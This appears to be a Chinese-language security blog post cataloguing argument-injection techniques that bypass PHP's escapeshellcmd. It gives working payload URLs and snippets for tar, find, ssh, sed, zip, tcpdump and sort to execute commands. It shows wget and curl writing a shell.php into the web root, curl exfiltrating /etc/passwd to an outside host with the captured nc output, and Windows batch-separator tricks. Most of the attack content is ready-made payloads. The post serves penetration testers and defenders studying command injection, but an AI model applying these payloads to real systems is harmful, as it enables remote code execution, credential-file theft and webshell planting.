---
layout:     post
title:      "从escapeshellcmd讲参数注入"
subtitle:   ""
date:       2020-08-12 19:40:00
author:     "kuron3k0"
header-img: "img/home-bg.jpg"
tags:
    - Command Injection
---

最近项目中遇到很多命令注入，但是或多或少多会有对输入进行过滤，导致利用异常困难，其中有的通过参数注入进行了绕过，现在就根据自己知道的和网上的一些利用方法做一下小结，今后遇到其他可以利用的命令再继续补充。

##  escapeshellcmd函数做了什么

| Function  | Description |
|:-------------:|:-------------:|
| [escapeshellcmd](http://www.php.net/manual/en/function.escapeshellcmd.php) | 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，反斜线（\）会在以下字符之前插入： &#;`\|*?~<>^()[]{}$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 |


可以看到，一些常见的命令注入的姿势都已经用不了了：

```php
<?php

echo "ls ".escapeshellcmd($_GET['cmd']);

//访问http://127.0.0.1/?cmd=%60id%60
//输出ls \`id\`

//访问http://127.0.0.1/?cmd=%24%28id%29
//输出ls \$\(id\)

//访问http://127.0.0.1/?cmd=%3b%28id%20%23
//输出ls \;id \#

//访问http://127.0.0.1/?cmd=%3eid
//输出ls \>id

//访问http://127.0.0.1/?cmd=%3cid
//输出ls \<id

//访问http://127.0.0.1/?cmd=%7cid
//输出ls \|id

//访问http://127.0.0.1/?cmd=%26id
//输出ls \&id

?>


```



## 参数注入

从上面可以看到，参数用了escapeshellcmd过滤之后，已经不可能插入执行第二条命令了。

但是我们通过查看PHP手册，可以看到escapeshellcmd并没有对`-`做转义，所以我们还是可以把参数传到命令中。

比如说`ls`命令 你就可以插进去`-lt`，在一定程度上能更改这条命令的本意。

局限性就是能产生的漏洞极度依赖原命令。

下面就列了一些可以利用来执行命令的参数。

### tar

访问`http://127.0.0.1/?cmd=-cf+/var/www/html/zzz+/etc/passwd`，将`/etc/passwd`压缩到`/var/www/html/zzz`，这样就可以在web目录下下载`zzz`文件，解压后就是`/etc/passwd`。


访问`http://127.0.0.1/?cmd=--use-compress-program%3d%27touch+/tmp/exploit%27+-cf+/tmp/passwd+/etc/passwd`，生成 `/tmp/exploit`，但是要注意的是在不同系统中命令的选项是会有差异的，tar这个参数在ubuntu能利用成功，但是在centos中就利用失败了。

```php
<?php

system("tar ".escapeshellcmd($_GET['cmd']));

?>
```

除了命令执行的方法触发外，还可以使用通配符注入的方式，假设有如下代码：
```php
<?php

system("tar cf backup.gz * “);

?>
```
当可以在目录下生成任意名字的文件时（不能是php等敏感后缀，也不能跨目录），可以生成这两个名字的文件`--checkpoint-action=exec='touch /tmp/test'`、`--checkpoint=1`，在tar进行压缩的时候也会执行对应命令，注意`--checkpoint=1`这个选项是必须的，不加上不会执行。



### find


find命令这个参数应该很多人都知道了，`-exec`，访问`http://127.0.0.1/?cmd=-exec+%27touch+test%27+%3b`。如果有正则`\-exec\W+`这样把`exec`参数过滤了的话，可以用`-execdir`，有一样的效果。

```php
<?php

system("find /tmp -iname ".escapeshellcmd($_GET['cmd']));

?>

```



### ssh


印象中曾经Gitlab就有过类似的漏洞，导入项目那里填的url为`ssh://-oProxyCommand=id`，就把`ProxyCommand`参数注入到命令中，放在php这里只需访问`http://127.0.0.1/?cmd=-oProxyCommand%3d%27touch+test%27+root%40localhost`。

```php
<?php

system("ssh ".escapeshellcmd($_GET['cmd']));

?>
```



### mysql


mysql的`-e`参数可以执行命令，但是因为反斜杠会被`escapeshellcmd`转义，所以只能应用在其他场景，例如红蓝对抗中绕过命令白名单执行命令或者是`escapeshellarg`。

```php
<?php

system("mysql -uroot -proot -e '\\! id'");

?>
```



### awk


awk也类似，需要用到括号

```php
<?php

system("cat /etc/passwd | awk 'system(\"id\")'");

?>
```



### sed


sed的命令执行很简单，只需访问`http://127.0.0.1/?cmd=%271e+exec+id%27`，`1e exec id`其实执行的是sed的命令，在第一行后执行`id`命令，感觉类似`preg_replace`的`/e`代码执行。但是奇怪的是man手册里没有提到这个`e`命令，也搜不到有关的信息，我也是在一个插件里面找到这个利用方法，有知道的师傅求告知。

```php
<?php
    
system("cat /etc/passwd | sed ".escapeshellcmd($_GET['cmd']));

?>
```



### tcpdump

```php
<?php

system("tcpdump ".escapeshellcmd($_GET['cmd']));

?>
```

tcpdump的利用刚好最近在项目中遇上了，是一个很巧妙的利用方法，可以看一下这条命令：
```shell
tcpdump -vv -n -i any -G 1 -z /usr/bin/php -U -A udp port 1234
```
当tcpdump的参数可以控制的时候，可以对抓到的包执行`-z`参数指定的命令，`-A`参数是以ASCII的方式打印的数据包内容。所以上述命令的含义简单来说就是，在udp端口1234进行监听，对接受到的数据包以ASCII的方式传给php执行。在本地我们再用nc对上述端口发一段php代码，即可实现命令执行：
```shell
echo "<?php system('id > /tmp/zzz');?>"|nc -u 127.0.0.1 1234
```
在centos执行成功，在ubuntu不知道为什么php提示无权限执行，可能是系统原因也可能是我配置问题。

这个利用方式具体可以参考一下[这篇文章](https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/)，文章里面留了一个坑，上面tcpdump的命令直接执行是不成功的，其实文章里也提到了相关信息，只是可能最后写命令的时候写漏了，感兴趣的大佬可以尝试一下看看。



### zip

zip命令中有一个`-T`参数，当配合 `--unzip-command`参数时，可以执行系统命令。只需访问`http://127.0.0.1/?cmd=-T+--unzip-command+%27touch+zzz%27+a.zip+aaa`  ，如果`--unzip-command`被过滤了的话，可以用`-TT`代替。

```php
<?php

system("zip ".escapeshellcmd($_GET['cmd']));

?>
```



### sort

网上有读文件的利用方法，访问`http://127.0.0.1/?cmd=/etc/passwd+-o+/var/www/html/temp`，即可读到任意文件；但是我在查看sort的其他参数的时候发现，还有这个参数`--compress-program`，对它的描述是这样的：

> --compress-program=PROG
>               compress temporaries with PROG; decompress them with PROG -d

联想到前面提到的tar命令，它执行命令的参数叫`--use-compress-program`，可以猜测到这也是执行命令的参数，在网上也能找到[例子](https://gist.github.com/fginter/2d4662faeef79acdb772)，很明显就是执行命令的地方：

```shell
INPUT=$1
OUTPUT=${INPUT%.gz}.sorted.gz
export LC_ALL=C
export LC_COLLATE=C
pigz -d -c $INPUT -p 4 | sort -S 50G --parallel 20 -T /mnt/ssd/tmp --compress-program "./pigz.sh" | pigz -b 2048 -p 20 > $OUTPUT
```

但是实际利用的时候却不成功，可能是系统的原因。


```php
<?php

system("sort ".escapeshellcmd($_GET['cmd']));

?>
```



能执行命令的参数不容易找，这里再举几个能读写任意文件的例子。

### wget

把php文件保存到web目录，默认为`/var/www/html`。

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```
也可以用`-O`（大写），注意小写是写wget命令输出的内容。
```php
$url = '-O /var/www/html/shell.php http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```
`-i`可以读本地文件，因为读出来的文件是会报错的，所以属于wget输出的内容，需要用小写的`-o`。

```php
$url = '-i /etc/passwd -o /var/www/html/tmp.txt';
system(escapeshellcmd('wget '.$url));
```



### sendmail

输出 `/etc/passwd` 到`/var/www/html/output`

```php
$from = 'from@sth.com -C/etc/passwd -X/var/www/html/output';
system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ));
```



### curl

下载php文件到web目录

```php
$url = 'http://example.com/xxxx -o /var/www/html/shell.php';
system(escapeshellcmd('curl '.$url));
```

读取`/etc/passwd` 并发送到`http://example.com`.
```php
$url = '-F password=@/etc/passwd http://example.com';
system(escapeshellcmd('curl '.$url));
```

服务端开个nc接收即可
```shell
root@kuroneko:/tmp/temp# nc -lvvp 6666
Listening on [0.0.0.0] (family 0, port 6666)
Connection from [127.0.0.1] port 6666 [tcp/*] accepted (family 2, sport 37160)
POST / HTTP/1.1
Host: 127.0.0.1:6666
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 2069
Expect: 100-continue
Content-Type: multipart/form-data; boundary=------------------------b831fd9594c6de88

--------------------------b831fd9594c6de88
Content-Disposition: form-data; name="password"; filename="passwd"
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
......

```



### openssl

读取`/etc/passwd`文件并输出到`/tmp/xxx`

```php
$url = 'enc -in /etc/passwd -out /tmp/xxx';
system(escapeshellcmd('openssl '.$url));
```



还有很多命令都有`-o`之类的参数，实在利用不了的话可以注入这种参数，可以作为任意文件覆盖。



### 其他

抛开参数注入说回命令注入，还有一些老版本PHP才有的漏洞，比如%00截断、%c0截断等，但是大部分在最新的PHP中已经利用不了了，这里有两个点还可以利用的。

在Windows的bat文件中，命令的分隔符和命令行有细微的差异，有研究员对此进行过fuzz，发现`\x1a`在bat文件中是可以作为分隔符的（出处在[这里](https://seclists.org/fulldisclosure/2016/Nov/67)），而在cmd中却不行，`escapeshellcmd`函数也是不会过滤`\x1a`的，所以执行以下代码：

```php
$dir = "ipconfig \x1a whoami";
file_put_contents('out.bat', escapeshellcmd('whatever '.$dir));
system('out.bat');
```
得到的结果为：
```bash
D:\tools\xampp\htdocs>whatever ipconfig D:\tools\xampp\htdocs>whoami 1-ac0049\Administrator
```

另外一个利用条件也是比较苛刻，假设我们可以设置一个环境变量`EVIL=AA&BB`，然后直接在命令注入中执行：

```bash
C:\Users\kuron3k0>set EVIL=AA^&BB

C:\Users\kuron3k0>echo %EVIL%
AA
'BB' 不是内部或外部命令，也不是可运行的程序
或批处理文件。
```

可以看到BB命令被执行了，但是`escapeshellcmd`是会过滤`%`的，所以只能在没过滤这个字符的情况下使用。


